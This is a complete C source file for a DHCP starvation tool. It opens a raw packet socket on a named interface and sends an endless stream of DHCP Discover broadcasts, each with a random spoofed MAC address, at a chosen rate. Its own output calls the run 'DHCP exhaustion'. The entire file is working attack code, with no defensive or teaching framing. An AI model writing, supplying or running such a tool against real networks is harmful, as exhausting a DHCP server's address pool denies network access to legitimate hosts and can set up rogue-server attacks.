#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <linux/if_packet.h>

struct dhcp_packet {
    uint8_t op;
    uint8_t htype;
    uint8_t hlen;
    uint8_t hops;
    uint32_t xid;
    uint16_t secs;
    uint16_t flags;
    uint32_t ciaddr;
    uint32_t yiaddr;
    uint32_t siaddr;
    uint32_t giaddr;
    uint8_t chaddr[16];
    uint8_t sname[64];
    uint8_t file[128];
    uint32_t magic_cookie;
    uint8_t options[312];
};

int g_sock_fd = -1;

unsigned short csum(unsigned short *buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// Signal handler
void sigint_handler(int sig_num) {
    printf("\nReceived Ctrl+C. Stopping DHCP exhaustion...\n");
    if (g_sock_fd != -1) {
        close(g_sock_fd);
    }
    exit(0);
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <interface_name> <requests_per_second>\n", argv[0]);
        return 1;
    }

    const char *interface_name = argv[1];
    int rps = atoi(argv[2]);

    if (rps <= 0) {
        fprintf(stderr, "Requests per second must be a positive integer.\n");
        return 1;
    }

    struct ifreq if_idx;
    struct sockaddr_ll socket_address;
    uint8_t buffer[65536];

    if (getuid() != 0) {
        fprintf(stderr, "This program must be run as root.\n");
        return 1;
    }

    // Set up signal handler
    signal(SIGINT, sigint_handler);

    g_sock_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (g_sock_fd < 0) {
        perror("Socket creation failed");
        return 1;
    }

    memset(&if_idx, 0, sizeof(struct ifreq));
    strncpy(if_idx.ifr_name, interface_name, IFNAMSIZ - 1);
    if (ioctl(g_sock_fd, SIOCGIFINDEX, &if_idx) < 0) {
        perror("SIOCGIFINDEX failed");
        close(g_sock_fd);
        return 1;
    }

    socket_address.sll_ifindex = if_idx.ifr_ifindex;
    socket_address.sll_halen = ETH_ALEN;

    srand(time(NULL));

    useconds_t delay_us = 1000000 / rps;
    fprintf(stdout, "Sending %d DHCP Discover packets per second on interface %s...\n", rps, interface_name);
    fprintf(stdout, "Delay between packets: %lu microseconds.\n", (unsigned long)delay_us);
    fprintf(stdout, "Press Ctrl+C to stop.\n");

    while (1) {
        memset(buffer, 0, sizeof(buffer));

        struct ether_header *eth_header = (struct ether_header *)buffer;
        struct iphdr *ip_header = (struct iphdr *)(buffer + sizeof(struct ether_header));
        struct udphdr *udp_header = (struct udphdr *)(buffer + sizeof(struct ether_header) + sizeof(struct iphdr));
        struct dhcp_packet *dhcp_pkt = (struct dhcp_packet *)(buffer + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr));

        // Ethernet Header
        uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        uint8_t spoofed_mac[6];
        spoofed_mac[0] = 0x00;
        spoofed_mac[1] = rand() % 256;
        spoofed_mac[2] = rand() % 256;
        spoofed_mac[3] = rand() % 256;
        spoofed_mac[4] = rand() % 256;
        spoofed_mac[5] = rand() % 256;

        memcpy(eth_header->ether_dhost, broadcast_mac, ETH_ALEN);
        memcpy(eth_header->ether_shost, spoofed_mac, ETH_ALEN);
        eth_header->ether_type = htons(ETH_P_IP);

        // IP Header
        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->id = htons(rand());
        ip_header->frag_off = htons(0x4000);
        ip_header->ttl = 64;
        ip_header->protocol = IPPROTO_UDP;
        ip_header->saddr = inet_addr("0.0.0.0");
        ip_header->daddr = inet_addr("255.255.255.255");

        // UDP Header
        udp_header->source = htons(68);
        udp_header->dest = htons(67);
        udp_header->check = 0;

        // DHCP Header
        dhcp_pkt->op = 1;
        dhcp_pkt->htype = 1;
        dhcp_pkt->hlen = 6;
        dhcp_pkt->hops = 0;
        dhcp_pkt->xid = htonl(rand());
        dhcp_pkt->secs = htons(0);
        dhcp_pkt->flags = htons(0x8000);
        dhcp_pkt->ciaddr = 0;
        dhcp_pkt->yiaddr = 0;
        dhcp_pkt->siaddr = 0;
        dhcp_pkt->giaddr = 0;
        memcpy(dhcp_pkt->chaddr, spoofed_mac, ETH_ALEN);

        dhcp_pkt->magic_cookie = htonl(0x63825363);

        uint8_t *opt_ptr = dhcp_pkt->options;
        *opt_ptr++ = 53; *opt_ptr++ = 1; *opt_ptr++ = 1;
        *opt_ptr++ = 255;

        int dhcp_options_len = (opt_ptr - dhcp_pkt->options);
        int dhcp_len = sizeof(struct dhcp_packet) - sizeof(dhcp_pkt->options) + dhcp_options_len;
        int udp_len = sizeof(struct udphdr) + dhcp_len;
        int ip_len = sizeof(struct iphdr) + udp_len;

        ip_header->tot_len = htons(ip_len);
        udp_header->len = htons(udp_len);

        // IP Checksum
        ip_header->check = 0;
        ip_header->check = csum((unsigned short *)ip_header, ip_header->ihl * 4 / 2);

        // Send packet
        int total_len = sizeof(struct ether_header) + ip_len;
        if (sendto(g_sock_fd, buffer, total_len, 0, (struct sockaddr *)&socket_address, sizeof(struct sockaddr_ll)) < 0) {
            perror("sendto failed");
        }

        fprintf(stdout, "Sent DHCP Discover with MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
                spoofed_mac[0], spoofed_mac[1], spoofed_mac[2], spoofed_mac[3], spoofed_mac[4], spoofed_mac[5]);

        usleep(delay_us);
    }

    close(g_sock_fd);
    return 0;
}
